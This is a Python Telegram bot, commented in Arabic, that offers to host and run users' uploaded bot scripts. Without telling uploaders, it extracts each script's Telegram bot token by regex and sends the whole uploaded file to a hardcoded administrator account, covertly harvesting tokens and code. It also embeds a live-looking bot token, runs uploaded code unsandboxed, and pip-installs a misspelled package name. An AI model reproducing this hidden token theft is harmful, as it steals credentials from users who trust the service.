

import os
os.system('pip install requests')
os.system('pip install random')
os.system('pip install bs4')
os.system('pip install json')
os.system('pip install datetime')
os.system('pip install time')
os.system('pip install user_agent')
os.system('pip install telebpt')
os.system('pip install faker')
os.system('pip install Pytelegrambotapi==3.7.7')
os.system('pip install types')
import telebot
import subprocess
import zipfile
import tempfile
import shutil
import requests
import re
import logging
from telebot import types
import time

# إعدادات البوت
TOKEN = '7665611889:AAH3gFRy7TiSWSaITvkLY-Wlrnvy8np0Bc0'  # توكن البوت
ADMIN_ID = '868526133'  # أي دي المسؤول

# تهيئة البوت
bot = telebot.TeleBot(TOKEN)

# المجلدات والمتغيرات
UPLOADED_FILES_DIR = 'uploaded_bots'
bot_scripts = {}
stored_tokens = {}

# إعداد التسجيل
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# إنشاء المجلد إذا لم يكن موجوداً
if not os.path.exists(UPLOADED_FILES_DIR):
    os.makedirs(UPLOADED_FILES_DIR)


def extract_token_from_script(script_path):
    """استخراج التوكن من ملف البوت"""
    try:
        with open(script_path, 'r', encoding='utf-8') as script_file:
            file_content = script_file.read()

            token_match = re.search(r"['\"]([0-9]{9,10}:[A-Za-z0-9_-]{35})['\"]", file_content)
            if token_match:
                return token_match.group(1)
            else:
                logger.warning(f"لم يتم العثور على توكن في {script_path}")
    except Exception as e:
        logger.error(f"فشل في استخراج التوكن من {script_path}: {e}")
    return None


def run_script(script_path, chat_id, folder_path, file_name, original_message):
    """تشغيل سكريبت البوت"""
    try:
        # تثبيت المتطلبات إذا وجدت
        requirements_path = os.path.join(os.path.dirname(script_path), 'requirements.txt')
        if os.path.exists(requirements_path):
            bot.send_message(chat_id, "🔄 جارٍ تثبيت المتطلبات...")
            subprocess.check_call(['pip', 'install', '-r', requirements_path])

        bot.send_message(chat_id, f"🚀 جارٍ تشغيل البوت {file_name}...")
        process = subprocess.Popen(['python3', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        bot_scripts[chat_id] = {'process': process, 'folder_path': folder_path, 'file_name': file_name}

        # استخراج التوكن وإرسال معلومات للمسؤول
        token = extract_token_from_script(script_path)
        user_info = f"@{original_message.from_user.username}" if original_message.from_user.username else str(original_message.from_user.id)
        
        if token:
            try:
                bot_info = requests.get(f'https://api.telegram.org/bot{token}/getMe').json()
                bot_username = bot_info['result']['username'] if bot_info.get('ok') else "غير معروف"
                caption = f"📤 قام المستخدم {user_info} برفع ملف بوت جديد. معرف البوت: @{bot_username}"
            except:
                caption = f"📤 قام المستخدم {user_info} برفع ملف بوت جديد. معرف البوت: غير معروف"
        else:
            caption = f"📤 قام المستخدم {user_info} برفع ملف بوت جديد، ولكن لم أتمكن من جلب معرف البوت."

        # إرسال الملف للمسؤول
        bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=caption)

        # إنشاء أزرار التحكم
        markup = types.InlineKeyboardMarkup()
        stop_button = types.InlineKeyboardButton(f"🔴 إيقاف {file_name}", callback_data=f'stop_{chat_id}')
        delete_button = types.InlineKeyboardButton(f"🗑️ حذف {file_name}", callback_data=f'delete_{chat_id}')
        markup.add(stop_button, delete_button)
        bot.send_message(chat_id, f"استخدم الأزرار أدناه للتحكم في البوت 👇", reply_markup=markup)

    except Exception as e:
        logger.error(f"حدث خطأ أثناء تشغيل البوت: {e}")
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء تشغيل البوت: {e}")


def stop_running_bot(chat_id):
    """إيقاف تشغيل البوت"""
    if chat_id in bot_scripts and 'process' in bot_scripts[chat_id]:
        bot_scripts[chat_id]['process'].terminate()
        bot.send_message(chat_id, "🔴 تم إيقاف تشغيل البوت.")
        del bot_scripts[chat_id]
    else:
        bot.send_message(chat_id, "⚠️ لا يوجد بوت يعمل حالياً.")


def delete_uploaded_file(chat_id):
    """حذف ملفات البوت"""
    if chat_id in bot_scripts and 'folder_path' in bot_scripts[chat_id]:
        folder_path = bot_scripts[chat_id]['folder_path']
        if os.path.exists(folder_path):
            shutil.rmtree(folder_path)
            bot.send_message(chat_id, "🗑️ تم حذف الملفات المتعلقة بالبوت.")
        else:
            bot.send_message(chat_id, "⚠️ الملفات غير موجودة.")
        if chat_id in bot_scripts:
            del bot_scripts[chat_id]
    else:
        bot.send_message(chat_id, "⚠️ لا توجد ملفات لحذفها.")


def get_custom_file_to_run(message):
    """الحصول على الملف المخصص للتشغيل"""
    try:
        chat_id = message.chat.id
        if chat_id in bot_scripts and 'folder_path' in bot_scripts[chat_id]:
            folder_path = bot_scripts[chat_id]['folder_path']
            custom_file_path = os.path.join(folder_path, message.text)

            if os.path.exists(custom_file_path):
                run_script(custom_file_path, chat_id, folder_path, message.text, message)
            else:
                bot.send_message(chat_id, "❌ الملف الذي حددته غير موجود. تأكد من الاسم وحاول مرة أخرى.")
        else:
            bot.send_message(chat_id, "❌ لم يتم العثور على معلومات التحميل. يرجى المحاولة مرة أخرى.")
    except Exception as e:
        logger.error(f"حدث خطأ: {e}")
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")


# معالجات الأوامر والرسائل
@bot.message_handler(commands=['start'])
def send_welcome(message):
    """معالج أمر البدء"""
    markup = types.InlineKeyboardMarkup()
    upload_button = types.InlineKeyboardButton('📤 رفع ملف', callback_data='upload')
    dev_channel_button = types.InlineKeyboardButton('🔧 قناة المطور', url='https://t.me/e_1bo')
    speed_button = types.InlineKeyboardButton('⚡ سرعة البوت', callback_data='speed')
    markup.add(upload_button)
    markup.add(speed_button, dev_channel_button)
    
    welcome_text = f"مرحباً، {message.from_user.first_name}! 👋\n✨ يمكنك استخدام الأزرار أدناه للتحكم:"
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup)


@bot.callback_query_handler(func=lambda call: call.data == 'speed')
def bot_speed_info(call):
    """فحص سرعة البوت"""
    try:
        start_time = time.time()
        response = requests.get(f'https://api.telegram.org/bot{TOKEN}/getMe')
        latency = time.time() - start_time
        if response.ok:
            bot.send_message(call.message.chat.id, f"⚡ سرعة البوت: {latency:.2f} ثانية.")
        else:
            bot.send_message(call.message.chat.id, "⚠️ فشل في الحصول على سرعة البوت.")
    except Exception as e:
        logger.error(f"خطأ في فحص السرعة: {e}")
        bot.send_message(call.message.chat.id, f"❌ حدث خطأ أثناء فحص سرعة البوت: {e}")


@bot.callback_query_handler(func=lambda call: call.data == 'upload')
def ask_to_upload_file(call):
    """طلب رفع الملف"""
    bot.send_message(call.message.chat.id, "📄 من فضلك، أرسل الملف الذي تريد رفعه.")


@bot.message_handler(content_types=['document'])
def handle_file(message):
    """معالجة الملفات المرسلة"""
    try:
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = message.document.file_name

        if file_name.endswith('.zip'):
            with tempfile.TemporaryDirectory() as temp_dir:
                zip_folder_name = file_name.split('.')[0]
                zip_folder_path = os.path.join(temp_dir, zip_folder_name)

                zip_path = os.path.join(temp_dir, file_name)
                with open(zip_path, 'wb') as new_file:
                    new_file.write(downloaded_file)
                    
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(zip_folder_path)

                final_folder_path = os.path.join(UPLOADED_FILES_DIR, zip_folder_name)
                if not os.path.exists(final_folder_path):
                    os.makedirs(final_folder_path)

                for root, dirs, files in os.walk(zip_folder_path):
                    for file in files:
                        src_file = os.path.join(root, file)
                        dest_file = os.path.join(final_folder_path, file)
                        shutil.move(src_file, dest_file)

                # البحث عن ملف التشغيل الرئيسي
                bot_py_path = os.path.join(final_folder_path, 'bot.py')
                run_py_path = os.path.join(final_folder_path, 'run.py')
                main_py_path = os.path.join(final_folder_path, 'main.py')

                if os.path.exists(run_py_path):
                    run_script(run_py_path, message.chat.id, final_folder_path, file_name, message)
                elif os.path.exists(bot_py_path):
                    run_script(bot_py_path, message.chat.id, final_folder_path, file_name, message)
                elif os.path.exists(main_py_path):
                    run_script(main_py_path, message.chat.id, final_folder_path, file_name, message)
                else:
                    bot.send_message(message.chat.id, "❓ لم أتمكن من العثور على bot.py أو run.py أو main.py. أرسل اسم الملف الرئيسي لتشغيله:")
                    bot_scripts[message.chat.id] = {'folder_path': final_folder_path}
                    bot.register_next_step_handler(message, get_custom_file_to_run)

        else:
            if not file_name.endswith('.py'):
                bot.reply_to(message, "⚠️ هذا البوت خاص برفع ملفات بايثون أو zip فقط. 🐍")
                return

            script_path = os.path.join(UPLOADED_FILES_DIR, file_name)
            with open(script_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            run_script(script_path, message.chat.id, UPLOADED_FILES_DIR, file_name, message)

    except Exception as e:
        logger.error(f"خطأ في معالجة الملف: {e}")
        bot.reply_to(message, f"❌ حدث خطأ: {e}")


@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    """معالجة استدعاءات الأزرار"""
    data_parts = call.data.split('_')
    action = data_parts[0]
    chat_id = int(data_parts[1]) if len(data_parts) > 1 else call.message.chat.id

    if action == 'stop':
        stop_running_bot(chat_id)
    elif action == 'delete':
        delete_uploaded_file(chat_id)


if __name__ == "__main__":
    logger.info("Starting bot...")
    bot.infinity_polling()
